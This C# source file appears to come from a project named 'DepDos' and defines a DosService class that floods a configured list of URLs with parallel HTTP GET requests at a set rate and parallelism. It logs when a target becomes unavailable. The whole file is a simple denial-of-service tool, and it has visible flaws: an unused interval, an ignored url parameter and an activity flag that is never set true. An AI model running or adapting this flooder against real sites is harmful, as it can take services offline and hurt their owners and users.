using System.Collections.Concurrent;
using DepDos.Core.Interfaces;

namespace DepDos.BusinessLogic.Dos;

public class DosService : IDosService
{
    private HttpClient _client;
    private bool _isActive = false;
    public DosService(HttpClient client)
    {
        _client = client;
    }
    
    public async void StartRequests(string url, IDosConfiguration configuration)
    {
        ProcessRequestsAsync(configuration, _client);
    }
    public void StopRequests()
    {
        _cancellationToken.Cancel();
        _isActive = false;
    }

    private CancellationTokenSource _cancellationToken;
    private void ProcessRequestsAsync(IDosConfiguration configuration, HttpClient client)
    {
        _cancellationToken = new CancellationTokenSource();
        var interval = TimeSpan.FromMinutes(1.0 / configuration.RequestsPerMinute);

        try
        {
            Parallel.ForEach(
                Partitioner.Create(0, configuration.RequestsPerMinute),
                new ParallelOptions { MaxDegreeOfParallelism = configuration.ParallelismLimit, CancellationToken = _cancellationToken.Token },
                range =>
                {
                    for (int i = range.Item1; i < range.Item2; i++)
                    {
                        _cancellationToken.Token.ThrowIfCancellationRequested();

                        Console.WriteLine($"PublisherThread Started: [{i}]");
                        try
                        {
                            foreach (var link in configuration.Urls)
                                client.GetAsync(link, _cancellationToken.Token).GetAwaiter().GetResult();
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"Task Closed without error [{i}]");
                        }
                        catch (OperationCanceledException)
                        {
                            
                        }
                        catch (Exception e)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"Service unavailable at Task [{i}] with ex [{e.StackTrace}]");
                        }
                        finally
                        {
                            _isActive = false;
                            Console.ForegroundColor = ConsoleColor.White;
                        }
                    }
                });
        }
        catch (OperationCanceledException)
        {
            Console.WriteLine("Processing was canceled.");
        }
    }
}